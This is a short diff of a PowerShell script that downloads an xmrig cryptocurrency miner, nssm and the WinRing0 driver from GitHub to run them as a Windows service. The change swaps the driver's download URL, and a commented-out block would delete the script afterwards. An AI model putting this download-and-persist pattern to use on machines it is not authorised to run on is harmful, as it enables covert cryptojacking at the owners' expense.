@@ -10,7 +10,7 @@ Write-Host "`nStep 3: Downloading files..."
 $urls = @{
     'xmrig.exe' = 'https://raw.githubusercontent.com/User07x07/Dopple/main/xmrig.exe'
     'nssm.exe' = 'https://raw.githubusercontent.com/User07x07/Dopple/main/nssm.exe'
-    'WinRing0x64.sys' = 'https://raw.githubusercontent.com/User07x07/Dopple/main/WinRing0x64.sys'
+    'WinRing0x64.sys' = 'https://github.com/xmrig/xmrig/raw/refs/heads/master/bin/WinRing0/WinRing0x64.sys'
 }
 
 $downloadSuccess = $true
@@ -253,7 +253,6 @@ Write-Host "Check Task Manager or 'services.msc' to verify." -ForegroundColor Gr
 # } catch {
 #     Write-Host "Could not remove script file." -ForegroundColor Yellow
 # }
-
 
 
 
